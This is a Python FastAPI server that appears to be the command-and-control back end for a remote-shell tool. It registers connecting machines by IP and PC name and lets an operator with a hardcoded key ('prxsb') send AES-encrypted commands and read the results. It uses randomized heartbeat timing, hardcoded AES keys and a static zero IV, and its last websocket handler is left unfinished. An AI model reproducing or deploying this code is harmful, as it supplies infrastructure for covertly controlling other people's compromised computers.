from http import client
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Body ,Request
from contextlib import asynccontextmanager
from pydantic import BaseModel
from tiny_aes import AES, pad
from tiny_random import TinyRandom
import asyncio
import uvicorn
import logging

IV = b'\x00' * 16
AES_KEY = [
    b'O\xca\xfd\x1f[\xaa=\x1a\xa4\x80\xc4}$q[p',
    b'\x92Z7\x11\x81m\xac5r[k\x13)\xf1V\t',
    b'\x8dq\x92t\xa9\x00\xc9\x04;Z\xfe\x15\xba7R ',
    b'\xea[\xdc\xe7\xc3\xaa\x8a\xeeN\xdb\x18\x9a\xe7\xdb\xd1\x9e',
    b'\xdc\x81/\x8bf\xb6}\xab\xa0\xa4\xbe\xd4c\x0e4:',
    b'-\xd5,\xa0\xca\x0e\xfd>\x16\x8f\xd2\xb5p9\xaf\x1e',
    b'\xba\xdd\xcc\x85\xd9\xd3\xf8\xbf\xf4\x06\xd4\x1f>\x08)!',
    b'(\x87\xfb\x94X\xbeT\x8a\x04\xfd\xb2\xef\xdd.JP',
    b')(\x9eO\x17 \xb7n?\xa7L\xfag\x19\x18p',
    b'\xf0P\xe3j-~\xa9:\x04V7u\x13v\x80\x1b',
    b',\xd1\xcc\xe1K\xc8\xd4\x91X\x18b\xd9uf\xcb\xe3',
    b'q0\xfc\x96bF|\x8dN\x97\xb0l\x05_d\xfd',
    b'\x17[6\xb2b=\xfdQ\x13\r\x01\xc7qK}J'
]

@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(heart_ping())
    yield
    task.cancel()
    try:
        await task
    except asyncio.CancelledError:
        logging.info("Heart ping task cancelled.")

tyrdm = TinyRandom()
tyaes = AES()
client_info = {}
client_counter = 1000
app = FastAPI(lifespan=lifespan)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

class SendBaseRequest(BaseModel):
    key: str
    client_id: int | None = 1000
    data: str

async def send_message(message, client_id):
    plaintext_bytes = message.encode('utf-8')
    padded = pad(plaintext_bytes)
    ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
    if client_id in client_info:
        websocket = client_info[client_id]["websocket"]
        await websocket.send_text(ciphertext.hex())
    else:
        logging.error(f"Client with ID {client_id} not found")

async def heart_ping():
    global client_counter
    while True:
        for client_id, info in list(client_info.items()):
            websocket = info["websocket"]
            try:
                await websocket.send_text("2f76b2aa378bbc56417c100659724fd9")
            except Exception as e:
                logging.error(f"Heartbeat failed for client {client_id}: {e}")
                client_info.pop(client_id, None)
        await asyncio.sleep(tyrdm.random(600, 1800))

# def get_message(message_hex):
#     ciphertext_bytes = bytes.fromhex(message_hex)
#     decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
#     unpadded = unpad(decrypted)
#     return unpadded.decode('utf-8')

async def handle_message(client_id, data):
    try:
        logging.info(data)
        if client_id in client_info:
            return_websocket = client_info[client_id].get("return_websocket")
            if return_websocket:
                await return_websocket.send_text(data)
        return data
    except Exception as e:
        logging.error(f"Failed to decrypt message from client {client_id}: {e}")
        return ""

@app.get("/api/server/client_list")
async def client_list():
    clients_dict = {
        info["pc_name"]: {
            "client_id": client_id,
            "ip": info["ip"],
            "from": info["from"]
        }
        for client_id, info in client_info.items()
    }
    return clients_dict

@app.post("/api/client/sendbase")
async def send_base_data(request: SendBaseRequest):
    if request.key != "prxsb":
        return {"status": "error", "message": "Invalid key"}
    client_id = request.client_id
    if client_id not in client_info:
        logging.error(f"Client with ID {client_id} not found")
        return {"status": "error", "message": "Client not found"}
    message = request.data
    try:
        await send_message(message, client_id)
    except Exception as e:
        logging.error(f"Failed to send message to client {client_id}: {e}")
        return {"status": "error", "message": "Failed to send message to client"}
    return {"status": "success", "message": "Message sent to client"}

@app.websocket("/api/server/shell")
async def shell(websocket: WebSocket):
    global client_counter
    required_headers = ["FRS", "FRSNode"]
    missing = [h for h in required_headers if h not in websocket.headers]
    if missing:
        raise HTTPException(status_code=403, detail=f"Missing header(s): {', '.join(missing)}")
    await websocket.accept()
    ip = websocket.client.host if websocket.client else "unknown"
    frs = websocket.headers.get("FRS")
    frsnode = websocket.headers.get("FRSNode")
    client_id = client_counter
    client_counter += 1
    client_info[client_id] = {
        "ip": ip,
        "from": frs,
        "pc_name": frsnode,
        "websocket": websocket
    }
    try:
        while True:
            data = await websocket.receive_text()
            await handle_message(client_id, data)
    except WebSocketDisconnect:
        logging.info(f"WebSocket disconnected from client {client_id}")
    except Exception as e:
        logging.error(f"Error processing WebSocket from client {client_id}: {e}")
    finally:
        client_info.pop(client_id, None)

@app.websocket("/api/client/return")
async def return_shell(websocket: WebSocket):
    if "key" not in websocket.headers:
        raise HTTPException(status_code=403, detail="Missing key header")
    if websocket.headers["key"] != "prxsb":
        raise HTTPException(status_code=403, detail="Invalid key")
    if "clientId" not in websocket.headers:
        raise HTTPException(status_code=403, detail="Missing clientId header")
    client_id = int(websocket.headers["clientId"])
    if client_id not in client_info:
        raise HTTPException(status_code=404, detail="Client not found")
    await websocket.accept()
    client_info[client_id]["return_websocket"] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            logging.info(f"Received return message from client {client_id}: {data}")
    except WebSocketDisconnect:
        logging.info(f"Return WebSocket disconnected from client {client_id}")
    except Exception as e:
        logging.error(f"Error processing return WebSocket from client {client_id}: {e}")
    finally:
        client_info[client_id].pop("return_websocket", None)

@app.websocket("/api/client/send")
async def send_msg(websocket: WebSocket):
    if "key" not in websocket.headers:
        raise HTTPException(status_code=403, detail="Missing key header")
    if websocket.headers["key"] != "prxsb":
        raise HTTPException(status_code=403, detail="Invalid key")
    if "clientId" not in websocket.headers:
        raise HTTPException(status_code=403, detail="Missing clientId header")
    client_id = int(websocket.headers["clientId"])
    if client_id not in client_info:
        raise HTTPException(status_code=404, detail="Client not found")
    await websocket.accept()
    client_info[client_id]["return_websocket"] = websocket
    


if __name__ == "__main__":
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        ws_ping_interval=None
    )
